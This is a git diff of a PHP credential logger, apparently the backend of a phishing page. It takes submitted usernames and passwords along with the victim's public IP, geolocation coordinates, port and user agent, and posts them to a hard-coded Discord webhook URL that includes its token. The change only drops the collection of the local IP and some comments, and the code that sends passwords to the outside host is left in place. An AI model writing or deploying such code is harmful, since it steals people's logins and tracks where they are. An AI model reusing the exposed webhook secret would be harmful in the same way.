@@ -1,8 +1,4 @@
 <?php
-function getLocalIP() {
-    return gethostbyname(gethostname());
-}
-
 function getPublicIP() {
     return file_get_contents('https://api.ipify.org');
 }
@@ -14,7 +10,6 @@ function getGeolocation($ip) {
 }
 
 function logData($username, $password) {
-    $localIP = getLocalIP();
     $publicIP = getPublicIP();
     $rem_port = $_SERVER['REMOTE_PORT']; 
     $user_agent = $_SERVER['HTTP_USER_AGENT']; 
@@ -28,7 +23,6 @@ function logData($username, $password) {
     $logMessage = [
         "username" => $username,
         "password" => $password,
-        "local_ip" => $localIP,
         "public_ip" => $publicIP,
         "geolocation" => $locationInfo,
         "latitude" => $latitude,
@@ -45,8 +39,6 @@ function logData($username, $password) {
 function sendToDiscordWebhook($data) {
     $webhookUrls = [
         'https://discord.com/api/webhooks/1295529347637055590/FO0C7KQJhZvUi7bhpjAZ2afMKbcpF34vKU19QA2omnKwFzTchgUhnBlTivPk6t87Sst8',  // Replace with your actual Discord webhook URL
-        // Add more webhook URLs here if you want
-        // 'https://discord.com/api/webhooks/another_webhook_url', // Example additional webhook
     ];
 
     $embed = [
@@ -55,7 +47,6 @@ function sendToDiscordWebhook($data) {
         "fields" => [
             ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
             ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
-            ["name" => "🌐 Local IP", "value" => "`" . $data['local_ip'] . "`", "inline" => true],
             ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
             ["name" => "📍 Latitude", "value" => "`" . $data['latitude'] . "`", "inline" => true],
             ["name" => "📏 Longitude", "value" => "`" . $data['longitude'] . "`", "inline" => true],
